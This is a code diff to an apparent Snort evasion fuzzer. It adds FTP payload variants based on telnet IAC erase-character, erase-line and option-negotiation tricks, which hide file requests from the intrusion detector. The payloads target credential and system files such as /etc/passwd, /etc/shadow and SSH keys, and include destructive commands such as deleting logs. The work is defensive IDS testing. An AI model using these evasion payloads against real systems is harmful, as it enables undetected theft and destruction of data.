@@ -135,6 +135,9 @@ def build_ftp_payload(strategy: str) -> bytes:
         variant = random.choice([
             "null_byte", "utf8_bom", "backslash_path", "overlong_utf8",
             "mixed_line_endings", "telnet_iac",
+            # CVE-2023-20071 inspired: telnet EAC/EAL semantic-gap evasion
+            "telnet_eac_evasion", "telnet_eal_wipe",
+            "iac_mid_command", "iac_segment_boundary",
         ])
         if variant == "null_byte":
             # Null byte injection in CWD path — tests if Snort truncates at \x00
@@ -179,7 +182,7 @@ def build_ftp_payload(strategy: str) -> bytes:
                 cmd = random.choice([b"NOOP", b"STAT", b"SYST", b"HELP"])
                 lines.append(cmd + random.choice(endings))
             return b"".join(lines)
-        else:  # telnet_iac
+        elif variant == "telnet_iac":
             # Telnet IAC sequences embedded in FTP stream (FTP runs over Telnet).
             # IAC sequences should be stripped; malformed ones confuse the parser.
             iac_cmds = [b'\xff\xf4', b'\xff\xf2', b'\xff\xfb\x03',
@@ -187,6 +190,83 @@ def build_ftp_payload(strategy: str) -> bytes:
             lines = [preamble]
             for _ in range(2000):
                 lines.append(random.choice(iac_cmds) + b"NOOP\r\n")
+            return b"".join(lines)
+        elif variant == "telnet_eac_evasion":
+            # CVE-2023-20071: IAC EAC (0xFF 0xF7) erases the previous character.
+            # Inject EAC sequences within file-access commands to create a
+            # semantic gap — Snort sees one filename, the server sees another.
+            # Example: "RETR safe.txt" + 8×EAC + "malw.exe" →
+            #   Snort (ignore_erase=true): "RETR safe.txtmalw.exe" (benign)
+            #   Server (processes erase):  "RETR malw.exe" (malicious)
+            IAC_EAC = b'\xff\xf7'
+            decoys = [b"safe.txt", b"readme.md", b"index.html", b"pubkey.pem"]
+            targets = [b"../../etc/passwd", b"../admin/config.db",
+                       b"/root/.ssh/id_rsa", b"..\\..\\windows\\system32\\sam"]
+            lines = [preamble]
+            for _ in range(500):
+                decoy = random.choice(decoys)
+                target = random.choice(targets)
+                cmd = random.choice([b"RETR", b"STOR", b"DELE", b"RMD"])
+                # N EAC sequences to erase the decoy, then the real target
+                erase = IAC_EAC * len(decoy)
+                lines.append(cmd + b" " + decoy + erase + target + b"\r\n")
+            return b"".join(lines)
+        elif variant == "telnet_eal_wipe":
+            # CVE-2023-20071: IAC EAL (0xFF 0xF8) erases the entire current line.
+            # Send a dangerous command, then EAL + benign command on same line.
+            # Snort may see only the benign part; server may execute the dangerous part.
+            IAC_EAL = b'\xff\xf8'
+            lines = [preamble]
+            for _ in range(500):
+                # Pattern: dangerous_cmd + EAL + benign_cmd
+                dangerous = random.choice([
+                    b"DELE /etc/shadow",
+                    b"RMD /var/log",
+                    b"STOR /root/.ssh/authorized_keys",
+                    b"RETR /etc/passwd",
+                ])
+                benign = random.choice([b"NOOP", b"STAT", b"PWD", b"SYST"])
+                lines.append(dangerous + IAC_EAL + benign + b"\r\n")
+            return b"".join(lines)
+        elif variant == "iac_mid_command":
+            # CVE-2023-20071: Insert multi-byte IAC option negotiation sequences
+            # (WILL/WONT/DO/DONT + option byte) in the middle of FTP commands.
+            # Snort must strip the 3-byte sequence to see the real command;
+            # incorrect stripping corrupts the parsed command or loses state.
+            iac_opts = [
+                b'\xff\xfb\x01',  # IAC WILL ECHO
+                b'\xff\xfb\x03',  # IAC WILL SGA
+                b'\xff\xfc\x01',  # IAC WONT ECHO
+                b'\xff\xfd\x18',  # IAC DO TERMINAL-TYPE
+                b'\xff\xfe\x20',  # IAC DONT LINEMODE
+                b'\xff\xfa\x18\x00\xff\xf0',  # IAC SB TERMINAL-TYPE IS IAC SE
+            ]
+            lines = [preamble]
+            for _ in range(500):
+                cmd = random.choice([b"RETR secret.dat", b"CWD /admin",
+                                     b"STOR payload.bin", b"LIST -la"])
+                # Insert IAC sequence at random position within the command
+                pos = random.randint(1, len(cmd) - 1)
+                iac = random.choice(iac_opts)
+                mangled = cmd[:pos] + iac + cmd[pos:]
+                lines.append(mangled + b"\r\n")
+            return b"".join(lines)
+        else:  # iac_segment_boundary
+            # CVE-2023-20071: Split IAC escape sequences across TCP segment
+            # boundaries. The 0xFF byte ends one segment; the escape code
+            # (0xF7/0xF8) starts the next. Tests whether Snort correctly
+            # reassembles before normalizing telnet escapes in FTP.
+            IAC = b'\xff'
+            escape_codes = [b'\xf7', b'\xf8', b'\xf4', b'\xf2']
+            lines = [preamble]
+            for _ in range(200):
+                cmd = random.choice([b"RETR ", b"STOR ", b"CWD ", b"DELE "])
+                path = random.choice([b"/etc/passwd", b"/admin/db.sqlite",
+                                      b"../../../root/.bashrc"])
+                # Build: cmd + partial_path + IAC (segment break) + escape + rest
+                split = random.randint(1, len(path) - 1)
+                lines.append(cmd + path[:split] + IAC)
+                lines.append(random.choice(escape_codes) + path[split:] + b"\r\n")
             return b"".join(lines)
 
     elif strategy == "rest_overflow":
